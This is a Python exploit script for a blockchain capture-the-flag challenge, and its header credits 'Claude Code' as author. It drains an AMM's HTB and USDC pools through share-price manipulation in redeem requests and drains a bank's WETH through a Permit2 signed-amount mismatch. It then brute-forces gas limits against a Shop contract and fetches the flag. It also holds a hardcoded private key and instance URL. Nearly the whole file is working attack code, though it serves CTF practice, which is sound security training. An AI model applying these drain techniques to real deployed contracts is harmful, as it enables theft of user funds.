#!/usr/bin/env python3
"""
The Bank That Breathed Numbers - Partial Exploit (AMM + Bank)

Author: Claude Code
Created: 2025-11-22
Last Updated: 2025-11-22

Purpose:
    Exploit 2 of 3 vulnerabilities in "The Bank That Breathed Numbers" challenge:
    1. AMM Price Manipulation - drain HTB and USDC pools
    2. Bank Permit2 Mismatch - drain WETH from bank

Assumptions:
    - Valid instance connection info (RPC, KEY, SETUP_ADDR)
    - Instance is active and not expired
    - Web3.py and eth_account are installed

Expected Result:
    - AMM HTB balance: 0
    - AMM USDC balance: 0
    - Bank WETH balance: 0
    - Bank ETH balance: 0
    - collected: False (Shop not solved)
    - isSolved(): False (4/5 conditions met)

Produced Result:
    - Successfully exploits AMM and Bank vulnerabilities
    - Shop vulnerability remains unsolved
    - See ATTEMPT_SUMMARY.md for Shop analysis

Usage:
    1. Update RPC, KEY, SETUP_ADDR with your instance details
    2. Run: python3 amm_bank_exploit.py
"""
from web3 import Web3
from eth_account import Account
from eth_account.messages import encode_typed_data
import requests

RPC = "http://154.57.164.66:31255/api/de202518-dc38-43c9-a245-dd0a05de968f"
KEY = "cf8ff35e272bea15cb01a858c6b5dfb697724a757cd808247b4c97f919d77b0b"
SETUP_ADDR = "0x32caE15ce9b33c28d9dEFA605C600725459D4406"

w3 = Web3(Web3.HTTPProvider(RPC))
acc = Account.from_key(KEY)

print(f"[*] Attacker: {acc.address}")
print(f"[*] ETH Balance: {w3.from_wei(w3.eth.get_balance(acc.address), 'ether')} ETH\n")

# Get contract addresses
setup_abi = [
    {'inputs':[],'name':'bank','outputs':[{'type':'address'}],'stateMutability':'view','type':'function'},
    {'inputs':[],'name':'amm','outputs':[{'type':'address'}],'stateMutability':'view','type':'function'},
    {'inputs':[],'name':'permit2','outputs':[{'type':'address'}],'stateMutability':'view','type':'function'},
    {'inputs':[],'name':'weth','outputs':[{'type':'address'}],'stateMutability':'view','type':'function'},
    {'inputs':[],'name':'htb','outputs':[{'type':'address'}],'stateMutability':'view','type':'function'},
    {'inputs':[],'name':'usdc','outputs':[{'type':'address'}],'stateMutability':'view','type':'function'},
    {'inputs':[{'name':'_player','type':'address'}],'name':'setPlayer','outputs':[],'stateMutability':'nonpayable','type':'function'},
    {'inputs':[{'name':'data','type':'bytes'}],'name':'collectPrize','outputs':[],'stateMutability':'nonpayable','type':'function'},
    {'inputs':[],'name':'isSolved','outputs':[{'type':'bool'}],'stateMutability':'view','type':'function'},
    {'inputs':[],'name':'collected','outputs':[{'type':'bool'}],'stateMutability':'view','type':'function'},
]

setup = w3.eth.contract(address=SETUP_ADDR, abi=setup_abi)
ba = setup.functions.bank().call()
aa = setup.functions.amm().call()
p2 = setup.functions.permit2().call()
wa = setup.functions.weth().call()
ha = setup.functions.htb().call()
ua = setup.functions.usdc().call()

print(f"[*] Bank: {ba}")
print(f"[*] AMM: {aa}")
print(f"[*] Permit2: {p2}")
print(f"[*] WETH: {wa}")
print(f"[*] HTB: {ha}")
print(f"[*] USDC: {ua}\n")

nc = 0
def tx(f, val=0, gas_limit=2000000):
    global nc
    t = f.build_transaction({'from': acc.address, 'nonce': w3.eth.get_transaction_count(acc.address) if nc == 0 else nc, 'gas': gas_limit, 'chainId': w3.eth.chain_id, 'gasPrice': w3.to_wei(20, 'gwei'), 'value': val})
    t.pop('maxFeePerGas', None); t.pop('maxPriorityFeePerGas', None)
    h = w3.eth.send_raw_transaction(acc.sign_transaction(t).raw_transaction)
    nc = t['nonce'] + 1
    return w3.eth.wait_for_transaction_receipt(h, timeout=60)['status'] == 1

weth = w3.eth.contract(address=wa, abi=[{'inputs':[{'name':'account','type':'address'}],'name':'balanceOf','outputs':[{'type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[{'name':'spender','type':'address'},{'name':'amount','type':'uint256'}],'name':'approve','outputs':[{'type':'bool'}],'stateMutability':'nonpayable','type':'function'}])
htb = w3.eth.contract(address=ha, abi=[{'inputs':[{'name':'spender','type':'address'},{'name':'amount','type':'uint256'}],'name':'approve','outputs':[{'type':'bool'}],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'name':'account','type':'address'}],'name':'balanceOf','outputs':[{'type':'uint256'}],'stateMutability':'view','type':'function'}])
usdc = w3.eth.contract(address=ua, abi=[{'inputs':[{'name':'spender','type':'address'},{'name':'amount','type':'uint256'}],'name':'approve','outputs':[{'type':'bool'}],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'name':'account','type':'address'}],'name':'balanceOf','outputs':[{'type':'uint256'}],'stateMutability':'view','type':'function'}])
amm = w3.eth.contract(address=aa, abi=[{'inputs':[],'name':'reserve0','outputs':[{'type':'uint112'}],'stateMutability':'view','type':'function'},{'inputs':[],'name':'reserve1','outputs':[{'type':'uint112'}],'stateMutability':'view','type':'function'},{'inputs':[{'name':'shares','type':'uint256'},{'name':'sharePrice','type':'uint256'}],'name':'redeemRequest','outputs':[{'type':'uint128'}],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'name':'sharesToFill','type':'uint256'},{'name':'payToken0','type':'bool'}],'name':'fulfillRedeemPartial','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'name':'amount0','type':'uint256'},{'name':'amount1','type':'uint256'}],'name':'addLiquidity','outputs':[{'type':'uint256'}],'stateMutability':'nonpayable','type':'function'}])
bank = w3.eth.contract(address=ba, abi=[{'inputs':[{'name':'','type':'address'},{'name':'','type':'address'}],'name':'balances','outputs':[{'type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[{'name':'token','type':'address'},{'name':'amount','type':'uint256'}],'name':'withdraw','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'components':[{'components':[{'name':'token','type':'address'},{'name':'amount','type':'uint256'}],'name':'permitted','type':'tuple'},{'name':'nonce','type':'uint256'},{'name':'deadline','type':'uint256'}],'name':'permit','type':'tuple'},{'components':[{'name':'to','type':'address'},{'name':'requestedAmount','type':'uint256'}],'name':'transferDetails','type':'tuple'},{'name':'owner','type':'address'},{'name':'signature','type':'bytes'}],'name':'depositTokenWithPermit','outputs':[],'stateMutability':'nonpayable','type':'function'}])

print("[1] Setup player")
tx(setup.functions.setPlayer(acc.address))

print("[2] Drain AMM")
tx(htb.functions.approve(aa, 1))
tx(usdc.functions.approve(aa, 1))
tx(amm.functions.addLiquidity(1, 1))
r0, r1 = amm.functions.reserve0().call(), amm.functions.reserve1().call()
print(f"    AMM reserves: {r0} HTB, {r1} USDC")
tx(amm.functions.redeemRequest(1, r0 * 10**18))
tx(amm.functions.fulfillRedeemPartial(1, True))
tx(amm.functions.redeemRequest(1, r1 * 10**18))
tx(amm.functions.fulfillRedeemPartial(1, False))
print(f"    ✓ AMM drained: {htb.functions.balanceOf(aa).call()} HTB, {usdc.functions.balanceOf(aa).call()} USDC")

print("[3] Drain Bank (Permit2 exploit)")
# Send 1 wei to WETH contract to get WETH
t = {'from': acc.address, 'to': wa, 'value': 1, 'nonce': nc, 'gas': 100000, 'chainId': w3.eth.chain_id, 'gasPrice': w3.to_wei(20, 'gwei')}
w3.eth.send_raw_transaction(acc.sign_transaction(t).raw_transaction)
nc += 1

tx(weth.functions.approve(p2, 10**30))

DRAIN = 300 * 10**18 + 1
pm = {'permitted': {'token': wa, 'amount': DRAIN}, 'spender': ba, 'nonce': 0, 'deadline': 2**256 - 1}
td = {'types': {'EIP712Domain': [{'name': 'name', 'type': 'string'}, {'name': 'chainId', 'type': 'uint256'}, {'name': 'verifyingContract', 'type': 'address'}], 'PermitTransferFrom': [{'name': 'permitted', 'type': 'TokenPermissions'}, {'name': 'spender', 'type': 'address'}, {'name': 'nonce', 'type': 'uint256'}, {'name': 'deadline', 'type': 'uint256'}], 'TokenPermissions': [{'name': 'token', 'type': 'address'}, {'name': 'amount', 'type': 'uint256'}]}, 'primaryType': 'PermitTransferFrom', 'domain': {'name': 'Permit2', 'chainId': w3.eth.chain_id, 'verifyingContract': p2}, 'message': pm}
sig = acc.sign_message(encode_typed_data(full_message=td))
tx(bank.functions.depositTokenWithPermit(((wa, DRAIN), 0, 2**256 - 1), (ba, 1), acc.address, sig.signature))
tx(bank.functions.withdraw(wa, bank.functions.balances(acc.address, wa).call()))
print(f"    ✓ Bank drained: {weth.functions.balanceOf(ba).call()} WETH")

print("[4] Exploit Shop")
# 300KB payload
hook_data = b'\x00' * 300000
# Gas Estimate: 3021920
# Target slightly below

start_gas = 2980000
end_gas = 3030000
step = 500

print(f"    Brute-forcing gas limits from {start_gas} to {end_gas} with 300KB payload...")

for limit in range(start_gas, end_gas, step):
    print(f"    Trying gas limit: {limit}")
    try:
        success = tx(setup.functions.collectPrize(hook_data), gas_limit=limit)
        if success:
            print(f"    ✓ Transaction mined")
            if setup.functions.collected().call():
                print("    ✓✓✓ COLLECTED!")
                break
            else:
                print("    ✗ Not collected")
        else:
            print("    ✗ Transaction failed (status 0)")
    except Exception as e:
        print(f"    ✗ Transaction failed: {e}")

print("[5] Check if solved")
if setup.functions.isSolved().call():
    print("✓✓✓ SOLVED!")
    # Get flag from API
    flag_url = "http://154.57.164.66:31255/api/flag"
    
    print(f"Fetching flag from {flag_url}...")
    flag = requests.get(flag_url).text
    print(f"\nFlag: {flag}")
else:
    print("\n✗ Not solved yet.")
    try:
        print(f"    Collected: {setup.functions.collected().call()}")
    except:
        pass
